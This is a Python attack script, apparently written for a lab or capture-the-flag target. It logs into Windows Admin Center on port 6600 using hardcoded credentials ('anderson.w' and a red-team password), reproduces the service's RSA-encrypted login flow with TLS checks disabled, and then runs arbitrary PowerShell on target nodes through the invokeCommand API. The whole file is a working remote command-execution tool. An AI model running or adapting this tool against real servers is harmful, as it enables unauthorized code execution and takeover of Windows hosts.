#!/usr/bin/env python3
"""Windows Admin Center (HTTPS:6600) — login + PowerShell invoke.

Env / defaults (override freely):
  TARGET / DC_IP   default 10.129.6.118
  WAC_PORT         default 6600
  WAC_USER         default anderson.w
  WAC_PASS         default R3dT3am@Acc3ss#01

Usage:
  python3 wac_ps.py -c 'whoami'
  python3 wac_ps.py -f local.ps1
  python3 wac_ps.py -c 'hostname' --user anderson.w --password '...'
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import sys

import requests
import urllib3
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

urllib3.disable_warnings()


def b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    return base64.b64decode(s + "=" * ((4 - len(s) % 4) % 4))


class WAC:
    def __init__(
        self,
        base: str | None = None,
        user: str | None = None,
        password: str | None = None,
        timeout: int = 45,
    ):
        ip = os.environ.get("TARGET") or os.environ.get("DC_IP") or "10.129.6.118"
        port = os.environ.get("WAC_PORT") or "6600"
        self.base = (base or f"https://{ip}:{port}").rstrip("/")
        self.user = user or os.environ.get("WAC_USER") or "anderson.w"
        self.password = password or os.environ.get("WAC_PASS") or "R3dT3am@Acc3ss#01"
        self.s = requests.Session()
        self.s.verify = False
        self._login(timeout)

    def _login(self, timeout: int) -> None:
        r = self.s.get(self.base + "/", timeout=timeout)
        r.raise_for_status()
        m = re.search(r'id="csrf"[^>]*value="([^"]+)"', r.text)
        if not m:
            raise RuntimeError("WAC: csrf token not found (wrong host/port?)")
        csrf = m.group(1)
        jwk = self.s.post(
            self.base + "/api/user/key", json={"csrf": csrf}, timeout=timeout
        ).json()["jwk"]
        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
        pub = RSAPublicNumbers(e, n).public_key(default_backend())
        data = json.dumps(
            {"username": self.user, "password": self.password, "csrf": csrf},
            separators=(",", ":"),
        )
        packet = base64.b64encode(
            pub.encrypt(
                data.encode(),
                padding.OAEP(
                    mgf=padding.MGF1(hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None,
                ),
            )
        ).decode()
        rr = self.s.post(
            self.base + "/api/user/login",
            json={"packet": packet, "csrf": csrf},
            timeout=timeout,
        )
        if rr.status_code != 200:
            raise RuntimeError(f"WAC login failed HTTP {rr.status_code}: {rr.text[:200]}")
        self.headers = {
            "X-XSRF-TOKEN": self.s.cookies.get("XSRF-TOKEN"),
            "Accept": "application/json",
            "Content-Type": "application/json",
        }

    def run(self, script: str, node: str = "localhost", timeout: int = 180) -> str:
        body = {
            "properties": {
                "script": script,
                "command": None,
                "module": None,
                "state": "ready",
            }
        }
        rr = self.s.post(
            f"{self.base}/api/nodes/{node}/features/powershellApi/invokeCommand",
            headers=self.headers,
            json=body,
            timeout=timeout,
        )
        j = rr.json()
        parts = []
        for x in j.get("results") or []:
            if x is None or isinstance(x, bool):
                continue
            parts.append(str(x))
        out = "\n".join(parts)
        if j.get("errors"):
            out += "\nERRS: " + json.dumps(j["errors"])[:1500]
        if j.get("exception"):
            out += "\nEXC: " + str(j["exception"])[:1500]
        return out

    def run_json(self, script: str, node: str = "localhost", timeout: int = 180) -> dict:
        body = {
            "properties": {
                "script": script,
                "command": None,
                "module": None,
                "state": "ready",
            }
        }
        rr = self.s.post(
            f"{self.base}/api/nodes/{node}/features/powershellApi/invokeCommand",
            headers=self.headers,
            json=body,
            timeout=timeout,
        )
        return rr.json()


def main() -> int:
    ap = argparse.ArgumentParser(description="WAC PowerShell runner")
    ap.add_argument("-c", "--cmd", help="PowerShell one-liner / script body")
    ap.add_argument("-f", "--file", help="local .ps1 to run")
    ap.add_argument("--user", default=None)
    ap.add_argument("--password", default=None)
    ap.add_argument("--base", default=None, help="e.g. https://10.129.6.118:6600")
    ap.add_argument("--timeout", type=int, default=180)
    args = ap.parse_args()
    if args.file:
        script = open(args.file, encoding="utf-8", errors="replace").read()
    else:
        script = args.cmd or "whoami; hostname"
    try:
        w = WAC(base=args.base, user=args.user, password=args.password)
        print(w.run(script, timeout=args.timeout))
    except Exception as e:
        print(f"[-] {e}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
